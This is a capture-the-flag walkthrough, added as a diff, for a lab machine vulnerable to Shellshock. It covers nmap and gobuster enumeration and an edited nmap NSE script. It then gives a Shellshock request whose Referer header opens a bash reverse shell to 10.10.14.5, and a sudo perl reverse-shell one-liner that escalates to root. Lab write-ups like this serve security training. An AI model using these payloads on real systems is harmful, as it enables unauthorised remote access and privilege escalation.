@@ -1,0 +1,88 @@
+1. Run nmap scan
+	mkidr nmap
+	cd nmap
+	nmap -sC -sV -oA results 10.10.10.56 
+
+2. Ssh version is leaked OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 
+   Google: OpenSSH 7.2p2 Ubuntu 4ubuntu2.2
+   Look for launchpad ubuntu website: update 2017-03-16
+   Shellshock is a lot older than this, installed bash manually to avoid kernel exploits for roots.
+   https://launchpad.net/ubuntu/+source/openssh/1:7.2p2-4ubuntu2.2
+  
+3. For apache search for packages in following websites: https://packages.ubuntu.com/
+   We go ahead an attempt to do a dirbuster but unfortunately are unable to find anything, this has
+   to do with the status codes that are being returned. Also do not use the default wordlist from 
+   dirbuster as these will lead to no results ("/" is not appended to directory we need). Use the 
+   following wordlist from dirb.
+   Wordlist: /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+
+   Full command: gobuster dir -u http://10.10.10.56 -w /usr/share/dirb/wordlists/small.txt -s 401,403
+    
+   This is done to get results for different status codes that might not be used by default by gobuster.
+	2020/01/29 01:28:09 Starting gobuster
+	===============================================================
+	/cgi-bin/ (Status: 403)
+
+   cgi-bin is generallly when apache gives something to bash to a different scripting language.
+
+4. Since we do not have access to directory, we have to run another gobuster starting from that forbidden
+   directory. 
+   Command: gobuster dir -u http://10.10.10.56/cgi-bin/ -w /usr/share/dirb/wordlists/small.txt -x sh,php
+
+   "-x" is utilized to append an extension to every word in the wordlist given that we are most likley
+   looking for a a file and not a directory.
+
+	===============================================================
+	2020/01/29 01:35:59 Starting gobuster
+	===============================================================
+	/user.sh (Status: 200)
+
+5. Next we use burp to analyze the response from that page, when we navigate it via web browser it 
+   automatically attempts to download itself. Analyzing with burp allows to figure out why. Apparently
+   since the response for the "content type" is not something that web browser can understand it
+   automatically tries to download itself. The response is "Content-Type: text/x-sh".
+
+6. Next we will attempt to run an nse script to determine if the page is vulnerable to shellshock. We
+   run the following:
+	nmap -p80 --script http-shellshock --script-args uri=/cgi-bin/user.sh,cmd=ls 10.10.10.56
+  
+   Unfortunately this does not work, so we will have to delve into the source code of the script.
+
+7. We create a redirector within burp, and have it forward stuff so that we can catch while the proxy is
+   on. The command is the following: 
+   nmap -sV -p 8081 --script http-shellshock --script-args uri=/cgi-bin/user.sh,cmd=ls 127.0.0.1
+
+   We should now have a list of webpage requests that have the shellshock payload in there. Turns out 
+   in a web request we have to delete an extra line that does not an extra variable header, which might 
+   confuse the webserver.
+
+   After commenting line 100 of the nse script, we are able to have nmap run the nse script properly and
+   is able to detect shellshock properly.
+
+   Line commented out: -- options["header"][cmd] = cmd
+
+   nmap -oN shellshock-scan -sV -p 8081 --script http-shellshock --script-args uri=/cgi-bin/user.sh,cmd=ls 127.0.0.1
+
+8. One thing to note is that when running commands the full path needs to be specified given that there
+   isn't a profile setup to allow the web user to execute commands without full path. We can fix this 
+   issue within the script by specifiying "/bin/bash -c ". Line 87 to add fix.
+	    Fix: cmd = '() { :;}; echo; /bin/bash -c '..cmd
+   Also note that there is an echo statement within each of the shellshock requests and that is because 
+   it needs an empty line after or it errors this is an rfc issue. Now is time to create our reverse 
+   shell. Send following request to server for shell:
+	GET /cgi-bin/user.sh HTTP/1.1
+	Referer: () { :;}; echo; /bin/bash -i >& /dev/tcp/10.10.14.5/1234 0>&1
+	Host: localhost:8081
+	Connection: close
+
+
+9. To obtain root, simply run "sudo -l" you will notice you can run "/usr/bin/perl", so just create 
+   reverse shell using sudo with perl.
+
+	/usr/bin/perl -e 'use Socket;$i="10.10.14.5";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};
+
+Done.
+
+
+
+
